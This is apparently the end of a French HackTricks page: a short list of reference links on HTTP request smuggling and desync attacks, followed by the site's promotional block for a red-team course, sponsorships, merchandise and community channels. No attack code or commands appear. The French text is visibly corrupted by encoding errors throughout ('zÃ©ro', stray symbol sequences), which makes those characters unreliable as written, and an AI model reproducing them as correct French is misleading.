* [https://medium.com/cyberverse/http-request-smuggling-in-plain-english-7080e48df8b4](https://medium.com/cyberverse/http-request-smuggling-in-plain-english-7080e48df8b4)
* [https://github.com/haroonawanofficial/HTTP-Desync-Attack/](https://github.com/haroonawanofficial/HTTP-Desync-Attack/)
* [https://memn0ps.github.io/2019/11/02/HTTP-Request-Smuggling-CL-TE.html](https://memn0ps.github.io/2019/11/02/HTTP-Request-Smuggling-CL-TE.html)
* [https://standoff365.com/phdays10/schedule/tech/http-request-smuggling-via-higher-http-versions/](https://standoff365.com/phdays10/schedule/tech/http-request-smuggling-via-higher-http-versions/)

<details>

<summary><strong>Apprenez le hacking AWS de zÃ©ro Ã  hÃ©ros avec</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong> !</strong></summary>

Autres moyens de soutenir HackTricks :

* Si vous souhaitez voir votre **entreprise annoncÃ©e dans HackTricks** ou **tÃ©lÃ©charger HackTricks en PDF**, consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop)!
* Obtenez le [**merchandising officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* DÃ©couvrez [**La Famille PEASS**](https://opensea.io/collection/the-peass-family), notre collection d'[**NFTs**](https://opensea.io/collection/the-peass-family) exclusifs
* **Rejoignez le** ğŸ’¬ [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe telegram**](https://t.me/peass) ou **suivez**-moi sur **Twitter** ğŸ¦ [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Partagez vos astuces de hacking en soumettant des PR aux dÃ©pÃ´ts github** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
